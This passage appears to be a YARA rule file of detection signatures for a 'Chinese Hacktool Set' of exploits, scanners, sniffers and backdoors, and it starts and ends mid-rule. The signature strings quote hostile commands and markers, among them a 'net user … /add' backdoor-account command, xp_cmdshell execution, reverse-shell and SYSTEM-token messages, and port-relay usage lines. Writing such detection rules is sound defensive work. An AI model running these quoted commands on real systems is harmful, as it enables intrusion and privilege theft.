	meta:
		description = "Chinese Hacktool Set - file xpf.sys"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "761125ab594f8dc996da4ce8ce50deba49c81846"
	strings:
		$s1 = "UnHook IoGetDeviceObjectPointer ok!" fullword ascii
		$s2 = "\\Device\\XScanPF" fullword wide
		$s3 = "\\DosDevices\\XScanPF" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule Project1 {
	meta:
		description = "Chinese Hacktool Set - file Project1.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
	strings:
		$s1 = "EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'" fullword ascii
		$s2 = "Password.txt" fullword ascii
		$s3 = "LoginPrompt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}

rule Arp_EMP_v1_0 {
	meta:
		description = "Chinese Hacktool Set - file Arp EMP v1.0.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ae4954c142ad1552a2abaef5636c7ef68fdd99ee"
	strings:
		$s0 = "Arp EMP v1.0.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule CN_Tools_MyUPnP {
	meta:
		description = "Chinese Hacktool Set - file MyUPnP.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "15b6fca7e42cd2800ba82c739552e7ffee967000"
	strings:
		$s1 = "<description>BYTELINKER.COM</description>" fullword ascii
		$s2 = "myupnp.exe" fullword ascii
		$s3 = "LOADER ERROR" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and all of them
}

rule CN_Tools_Shiell {
	meta:
		description = "Chinese Hacktool Set - file Shiell.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b432d80c37abe354d344b949c8730929d8f9817a"
	strings:
		$s1 = "C:\\Users\\Tong\\Documents\\Visual Studio 2012\\Projects\\Shift shell" ascii
		$s2 = "C:\\Windows\\System32\\Shiell.exe" fullword wide
		$s3 = "Shift shell.exe" fullword wide
		$s4 = "\" /v debugger /t REG_SZ /d \"" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and 2 of them
}

rule cndcom_cndcom {
	meta:
		description = "Chinese Hacktool Set - file cndcom.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "08bbe6312342b28b43201125bd8c518531de8082"
	strings:
		$s1 = "- Rewritten by HDM last <hdm [at] metasploit.com>" fullword ascii
		$s2 = "- Usage: %s <Target ID> <Target IP>" fullword ascii
		$s3 = "- Remote DCOM RPC Buffer Overflow Exploit" fullword ascii
		$s4 = "- Warning:This Code is more like a dos tool!(Modify by pingker)" fullword ascii
		$s5 = "Windows NT SP6 (Chinese)" fullword ascii
		$s6 = "- Original code by FlashSky and Benjurry" fullword ascii
		$s7 = "\\C$\\123456111111111111111.doc" fullword wide
		$s8 = "shell3all.c" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule IsDebug_V1_4 {
	meta:
		description = "Chinese Hacktool Set - file IsDebug V1.4.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ca32474c358b4402421ece1cb31714fbb088b69a"
	strings:
		$s0 = "IsDebug.dll" fullword ascii
		$s1 = "SV Dumper V1.0" fullword wide
		$s2 = "(IsDebuggerPresent byte Patcher)" fullword ascii
		$s8 = "Error WriteMemory failed" fullword ascii
		$s9 = "IsDebugPresent" fullword ascii
		$s10 = "idb_Autoload" fullword ascii
		$s11 = "Bin Files" fullword ascii
		$s12 = "MASM32 version" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and all of them
}

rule HTTPSCANNER {
	meta:
		description = "Chinese Hacktool Set - file HTTPSCANNER.EXE"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ae2929346944c1ea3411a4562e9d5e2f765d088a"
	strings:
		$s1 = "HttpScanner.exe" fullword wide
		$s2 = "HttpScanner" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3500KB and all of them
}

rule HScan_v1_20_PipeCmd {
	meta:
		description = "Chinese Hacktool Set - file PipeCmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "64403ce63b28b544646a30da3be2f395788542d6"
	strings:
		$s1 = "%SystemRoot%\\system32\\PipeCmdSrv.exe" fullword ascii
		$s2 = "PipeCmd.exe" fullword wide
		$s3 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s4 = "%s\\pipe\\%s%s%d" fullword ascii
		$s5 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "This is a service executable! Couldn't start directly." fullword ascii
		$s8 = "Connecting to Remote Server ...Failed" fullword ascii
		$s9 = "PIPECMDSRV" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 4 of them
}

rule Dos_fp {
	meta:
		description = "Chinese Hacktool Set - file fp.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s1 = "fpipe -l 53 -s 53 -r 80 192.168.1.101" fullword ascii
		$s2 = "FPipe.exe" fullword wide
		$s3 = "http://www.foundstone.com" fullword ascii
		$s4 = "%s %s port %d. Address is already in use" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 65KB and all of them
}

rule Dos_netstat {
	meta:
		description = "Chinese Hacktool Set - file netstat.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d0444b7bd936b5fc490b865a604e97c22d97e598"
	strings:
		$s0 = "w03a2409.dll" fullword ascii
		$s1 = "Retransmission Timeout Algorithm    = unknown (%1!u!)" fullword wide  /* Goodware String - occured 2 times */
		$s2 = "Administrative Status  = %1!u!" fullword wide  /* Goodware String - occured 2 times */
		$s3 = "Packet Too Big            %1!-10u!  %2!-10u!" fullword wide  /* Goodware String - occured 2 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule CN_Tools_xsniff {
	meta:
		description = "Chinese Hacktool Set - file xsniff.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s0 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s1 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s2 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s10 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s11 = "%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}

rule MSSqlPass {
	meta:
		description = "Chinese Hacktool Set - file MSSqlPass.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "172b4e31ed15d1275ac07f3acbf499daf9a055d7"
	strings:
		$s0 = "Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server" wide
		$s1 = "empv.exe" fullword wide
		$s2 = "Enterprise Manager PassView" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and all of them
}

rule WSockExpert {
	meta:
		description = "Chinese Hacktool Set - file WSockExpert.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2962bf7b0883ceda5e14b8dad86742f95b50f7bf"
	strings:
		$s1 = "OpenProcessCmdExecute!" fullword ascii
		$s2 = "http://www.hackp.com" fullword ascii
		$s3 = "'%s' is not a valid time!'%s' is not a valid date and time" fullword wide
		$s4 = "SaveSelectedFilterCmdExecute" fullword ascii
		$s5 = "PasswordChar@" fullword ascii
		$s6 = "WSockHook.DLL" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}

rule Ms_Viru_racle {
	meta:
		description = "Chinese Hacktool Set - file racle.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "13116078fff5c87b56179c5438f008caf6c98ecb"
	strings:
		$s0 = "PsInitialSystemProcess @%p" fullword ascii
		$s1 = "PsLookupProcessByProcessId(%u) Failed" fullword ascii
		$s2 = "PsLookupProcessByProcessId(%u) => %p" fullword ascii
		$s3 = "FirstStage() Loaded, CurrentThread @%p Stack %p - %p" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 210KB and all of them
}

rule lamescan3 {
	meta:
		description = "Chinese Hacktool Set - file lamescan3.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3130eefb79650dab2e323328b905e4d5d3a1d2f0"
	strings:
		$s1 = "dic\\loginlist.txt" fullword ascii
		$s2 = "Radmin.exe" fullword ascii
		$s3 = "lamescan3.pdf!" fullword ascii
		$s4 = "dic\\passlist.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3740KB and all of them
}

rule CN_Tools_pc {
	meta:
		description = "Chinese Hacktool Set - file pc.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5cf8caba170ec461c44394f4058669d225a94285"
	strings:
		$s0 = "\\svchost.exe" fullword ascii
		$s2 = "%s%08x.001" fullword ascii
		$s3 = "Qy001Service" fullword ascii
		$s4 = "/.MIKY" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule Dos_Down64 {
	meta:
		description = "Chinese Hacktool Set - file Down64.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "43e455e43b49b953e17a5b885ffdcdf8b6b23226"
	strings:
		$s1 = "C:\\Windows\\Temp\\Down.txt" fullword wide
		$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
		$s3 = "C:\\Windows\\Temp\\" fullword wide
		$s4 = "ProcessXElement" fullword ascii
		$s8 = "down.exe" fullword wide
		$s20 = "set_Timer1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule epathobj_exp32 {
	meta:
		description = "Chinese Hacktool Set - file epathobj_exp32.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ed86ff44bddcfdd630ade8ced39b4559316195ba"
	strings:
		$s0 = "Watchdog thread %d waiting on Mutex" fullword ascii
		$s1 = "Exploit ok run command" fullword ascii
		$s2 = "\\epathobj_exp\\Release\\epathobj_exp.pdb" fullword ascii
		$s3 = "Alllocated userspace PATHRECORD () %p" fullword ascii
		$s4 = "Mutex object did not timeout, list not patched" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 270KB and all of them
}

rule Tools_unknown {
	meta:
		description = "Chinese Hacktool Set - file unknown.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4be8270c4faa1827177e2310a00af2d5bcd2a59f"
	strings:
		$s1 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s2 = "GET /ok.asp?id=1__sql__ HTTP/1.1" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s4 = "Failed to clear tab control Failed to delete tab at index %d\"Failed to retrieve" wide
		$s5 = "Host: 127.0.0.1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}

rule PLUGIN_AJunk {
	meta:
		description = "Chinese Hacktool Set - file AJunk.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "eb430fcfe6d13b14ff6baa4b3f59817c0facec00"
	strings:
		$s1 = "AJunk.dll" fullword ascii
		$s2 = "AJunk.DLL" fullword wide
		$s3 = "AJunk Dynamic Link Library" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 560KB and all of them
}

rule IISPutScanner {
	meta:
		description = "Chinese Hacktool Set - file IISPutScanner.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9869c70d6a9ec2312c749aa17d4da362fa6e2592"
	strings:
		$s2 = "KERNEL32.DLL" fullword ascii
		$s3 = "ADVAPI32.DLL" fullword ascii
		$s4 = "VERSION.DLL" fullword ascii
		$s5 = "WSOCK32.DLL" fullword ascii
		$s6 = "COMCTL32.DLL" fullword ascii
		$s7 = "GDI32.DLL" fullword ascii
		$s8 = "SHELL32.DLL" fullword ascii
		$s9 = "USER32.DLL" fullword ascii
		$s10 = "OLEAUT32.DLL" fullword ascii
		$s11 = "LoadLibraryA" fullword ascii
		$s12 = "GetProcAddress" fullword ascii
		$s13 = "VirtualProtect" fullword ascii
		$s14 = "VirtualAlloc" fullword ascii
		$s15 = "VirtualFree" fullword ascii
		$s16 = "ExitProcess" fullword ascii
		$s17 = "RegCloseKey" fullword ascii
		$s18 = "GetFileVersionInfoA" fullword ascii
		$s19 = "ImageList_Add" fullword ascii
		$s20 = "BitBlt" fullword ascii
		$s21 = "ShellExecuteA" fullword ascii
		$s22 = "ActivateKeyboardLayout" fullword ascii
		$s23 = "BBABORT" fullword wide
		$s25 = "BBCANCEL" fullword wide
		$s26 = "BBCLOSE" fullword wide
		$s27 = "BBHELP" fullword wide
		$s28 = "BBIGNORE" fullword wide
		$s29 = "PREVIEWGLYPH" fullword wide
		$s30 = "DLGTEMPLATE" fullword wide
		$s31 = "TABOUTBOX" fullword wide
		$s32 = "TFORM1" fullword wide
		$s33 = "MAINICON" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them
}

rule IDTools_For_WinXP_IdtTool_2 {
	meta:
		description = "Chinese Hacktool Set - file IdtTool.sys"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "07feb31dd21d6f97614118b8a0adf231f8541a67"
	strings:
		$s0 = "\\Device\\devIdtTool" fullword wide
		$s1 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
		$s3 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
		$s6 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
		$s7 = "IoCreateDevice" fullword ascii /* Goodware String - occured 988 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 7KB and all of them
}

rule hkmjjiis6 {
	meta:
		description = "Chinese Hacktool Set - file hkmjjiis6.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4cbc6344c6712fa819683a4bd7b53f78ea4047d7"
	strings:
		$s1 = "comspec" fullword ascii
		$s2 = "user32.dlly" ascii
		$s3 = "runtime error" ascii
		$s4 = "WinSta0\\Defau" ascii
		$s5 = "AppIDFlags" fullword ascii
		$s6 = "GetLag" fullword ascii
		$s7 = "* FROM IIsWebInfo" ascii
		$s8 = "wmiprvse.exe" ascii
		$s9 = "LookupAcc" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and all of them
}

rule Dos_lcx {
	meta:
		description = "Chinese Hacktool Set - file lcx.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6ad5dd13592160d9f052bb47b0d6a87b80a406d"
	strings:
		$s0 = "c:\\Users\\careful_snow\\" ascii
		$s1 = "Desktop\\Htran\\Release\\Htran.pdb" ascii
		$s3 = "[SERVER]connection to %s:%d error" fullword ascii
		$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s6 = "=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] " ascii
		$s7 = "[-] There is a error...Create a new connection." fullword ascii
		$s8 = "[+] Accept a Client on port %d from %s" fullword ascii
		$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s13 = "[+] Make a Connection to %s:%d...." fullword ascii
		$s16 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
		$s17 = "[+] Waiting another Client on port:%d...." fullword ascii
		$s18 = "[+] Accept a Client on port %d from %s ......" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule x_way2_5_X_way {
	meta:
		description = "Chinese Hacktool Set - file X-way.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8ba8530fbda3e8342e8d4feabbf98c66a322dac6"
	strings:
		$s0 = "TTFTPSERVERFRM" fullword wide
		$s1 = "TPORTSCANSETFRM" fullword wide
		$s2 = "TIISSHELLFRM" fullword wide
		$s3 = "TADVSCANSETFRM" fullword wide
		$s4 = "ntwdblib.dll" fullword ascii
		$s5 = "TSNIFFERFRM" fullword wide
		$s6 = "TCRACKSETFRM" fullword wide
		$s7 = "TCRACKFRM" fullword wide
		$s8 = "dbnextrow" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them
}

rule tools_Sqlcmd {
	meta:
		description = "Chinese Hacktool Set - file Sqlcmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "99d56476e539750c599f76391d717c51c4955a33"
	strings:
		$s0 = "[Usage]:  %s <HostName|IP> <UserName> <Password>" fullword ascii
		$s1 = "=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============" fullword ascii /* PEStudio Blacklist: os */
		$s4 = "Cool! Connected to SQL server on %s successfully!" fullword ascii
		$s5 = "EXEC master..xp_cmdshell \"%s\"" fullword ascii
		$s6 = "=======================Sqlcmd v0.21 For HScan v1.20=======================" fullword ascii
		$s10 = "Error,exit!" fullword ascii
		$s11 = "Sqlcmd>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and 3 of them
}

rule Sword1_5 {
	meta:
		description = "Chinese Hacktool Set - file Sword1.5.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
	strings:
		$s3 = "http://www.ip138.com/ip2city.asp" fullword wide
		$s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s6 = "ListBox_Command" fullword wide
		$s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
		$s18 = "\\Set.ini" fullword wide
		$s19 = "OpenFileDialog1" fullword wide
		$s20 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 4 of them
}

rule Tools_scan {
	meta:
		description = "Chinese Hacktool Set - file scan.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c580a0cc41997e840d2c0f83962e7f8b636a5a13"
	strings:
		$s2 = "Shanlu Studio" fullword wide
		$s3 = "_AutoAttackMain" fullword ascii
		$s4 = "_frmIpToAddr" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Dos_c {
	meta:
		description = "Chinese Hacktool Set - file c.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3deb6bd52fdac6d5a3e9a91c585d67820ab4df78"
	strings:
		$s0 = "!Win32 .EXE." fullword ascii
		$s1 = ".MPRESS1" fullword ascii
		$s2 = ".MPRESS2" fullword ascii
		$s3 = "XOLEHLP.dll" fullword ascii
		$s4 = "</body></html>" fullword ascii
		$s8 = "DtcGetTransactionManagerExA" fullword ascii  /* Goodware String - occured 12 times */
		$s9 = "GetUserNameA" fullword ascii  /* Goodware String - occured 305 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule arpsniffer {
	meta:
		description = "Chinese Hacktool Set - file arpsniffer.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "7d8753f56fc48413fc68102cff34b6583cb0066c"
	strings:
		$s1 = "SHELL" ascii
		$s2 = "PacketSendPacket" fullword ascii
		$s3 = "ArpSniff" ascii
		$s4 = "pcap_loop" fullword ascii  /* Goodware String - occured 3 times */
		$s5 = "packet.dll" fullword ascii  /* Goodware String - occured 4 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and all of them
}

rule pw_inspector_2 {
	meta:
		description = "Chinese Hacktool Set - file pw-inspector.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf"
	strings:
		$s1 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
		$s2 = "Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p " ascii
		$s3 = "PW-Inspector" fullword ascii
		$s4 = "i:o:m:M:c:lunps" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule datPcShare {
	meta:
		description = "Chinese Hacktool Set - file datPcShare.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "87acb649ab0d33c62e27ea83241caa43144fc1c4"
	strings:
		$s1 = "PcShare.EXE" fullword wide
		$s2 = "MZKERNEL32.DLL" fullword ascii
		$s3 = "PcShare" fullword wide
		$s4 = "QQ:4564405" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule Tools_xport {
	meta:
		description = "Chinese Hacktool Set - file xport.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9584de562e7f8185f721e94ee3cceac60db26dda"
	strings:
		$s1 = "Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)" fullword ascii
		$s2 = "Example: xport www.xxx.com 80 -m syn" fullword ascii
		$s3 = "%s - command line port scanner" fullword ascii
		$s4 = "xport 192.168.1.1 1-1024 -t 200 -v" fullword ascii
		$s5 = "Usage: xport <Host> <Ports Scope> [Options]" fullword ascii
		$s6 = ".\\port.ini" fullword ascii
		$s7 = "Port scan complete, total %d port, %d port is opened, use %d ms." fullword ascii
		$s8 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s9 = "http://www.xfocus.org" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule Pc_xai {
	meta:
		description = "Chinese Hacktool Set - file xai.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f285a59fd931ce137c08bd1f0dae858cc2486491"
	strings:
		$s1 = "Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/" fullword wide
		$s2 = "%SystemRoot%\\System32\\" fullword ascii
		$s3 = "%APPDATA%\\" fullword ascii
		$s4 = "---- C.Rufus Security Team ----" fullword wide
		$s5 = "www.snzzkz.com" fullword wide
		$s6 = "%CommonProgramFiles%\\" fullword ascii
		$s7 = "GetRand.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Radmin_Hash {
	meta:
		description = "Chinese Hacktool Set - file Radmin_Hash.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "be407bd5bf5bcd51d38d1308e17a1731cd52f66b"
	strings:
		$s1 = "<description>IEBars</description>" fullword ascii
		$s2 = "PECompact2" fullword ascii
		$s3 = "Radmin, Remote Administrator" fullword wide
		$s4 = "Radmin 3.0 Hash " fullword wide
		$s5 = "HASH1.0" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule OSEditor {
	meta:
		description = "Chinese Hacktool Set - file OSEditor.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6773c3c6575cf9cfedbb772f3476bb999d09403d"
	strings:
		$s1 = "OSEditor.exe" fullword wide
		$s2 = "netsafe" wide
		$s3 = "OSC Editor" fullword wide
		$s4 = "GIF89" ascii
		$s5 = "Unlock" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule GoodToolset_ms11011 {
	meta:
		description = "Chinese Hacktool Set - file ms11011.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5ad7a4962acbb6b0e3b73d77385eb91feb88b386"
	strings:
		$s0 = "\\i386\\Hello.pdb" ascii
		$s1 = "OS not supported." fullword ascii
		$s3 = "Not supported." fullword wide  /* Goodware String - occured 3 times */
		$s4 = "SystemDefaultEUDCFont" fullword wide  /* Goodware String - occured 18 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule FreeVersion_release {
	meta:
		description = "Chinese Hacktool Set - file release.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f42e4b5748e92f7a450eb49fc89d6859f4afcebb"
	strings:
		$s1 = "-->Got WMI process Pid: %d " ascii
		$s2 = "This exploit will execute \"net user " ascii
		$s3 = "net user temp 123456 /add & net localgroup administrators temp /add" fullword ascii
		$s4 = "Running reverse shell" ascii
		$s5 = "wmiprvse.exe" fullword ascii
		$s6 = "SELECT * FROM IIsWebInfo" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}

rule churrasco {
	meta:
		description = "Chinese Hacktool Set - file churrasco.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a8d4c177948a8e60d63de9d0ed948c50d0151364"
	strings:
		$s1 = "Done, command should have ran as SYSTEM!" ascii
		$s2 = "Running command with SYSTEM Token..." ascii
		$s3 = "Thread impersonating, got NETWORK SERVICE Token: 0x%x" ascii
		$s4 = "Found SYSTEM token 0x%x" ascii
		$s5 = "Thread not impersonating, looking for another thread..." ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}
rule x64_KiwiCmd {
	meta:
		description = "Chinese Hacktool Set - file KiwiCmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
	strings:
		$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
		$s2 = "Kiwi Cmd no-gpo" fullword wide
		$s3 = "KiwiAndCMD" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 2 of them
}

rule sql1433_SQL {
	meta:
		description = "Chinese Hacktool Set - file SQL.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "025e87deadd1c50b1021c26cb67b76b476fafd64"
	strings:
		/* WIDE: ProductName 1433 */
		$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }
		/* WIDE: ProductVersion 1,4,3,3 */
		$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }
	condition:
		uint16(0) == 0x5a4d and filesize < 90KB and all of them
}

rule CookieTools2 {
	meta:
		description = "Chinese Hacktool Set - file CookieTools2.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cb67797f229fdb92360319e01277e1345305eb82"
	strings:
		$s1 = "www.gxgl.com&www.gxgl.net" fullword wide
		$s2 = "ip.asp?IP=" fullword ascii
		$s3 = "MSIE 5.5;" fullword ascii
		$s4 = "SOFTWARE\\Borland\\" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule cyclotron {
	meta:
		description = "Chinese Hacktool Set - file cyclotron.sys"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5b63473b6dc1e5942bf07c52c31ba28f2702b246"
	strings:
		$s1 = "\\Device\\IDTProt" fullword wide
		$s2 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
		$s3 = "\\??\\slIDTProt" fullword wide
		$s4 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
		$s5 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 3KB and all of them
}

rule xscan_gui {
	meta:
		description = "Chinese Hacktool Set - file xscan_gui.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
	strings:
		$s1 = "%s -mutex %s -host %s -index %d -config \"%s\"" fullword ascii
		$s2 = "www.target.com" fullword ascii
		$s3 = "%s\\scripts\\desc\\%s.desc" fullword ascii
		$s4 = "%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Tools_hscan {
	meta:
		description = "Chinese Hacktool Set - file hscan.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
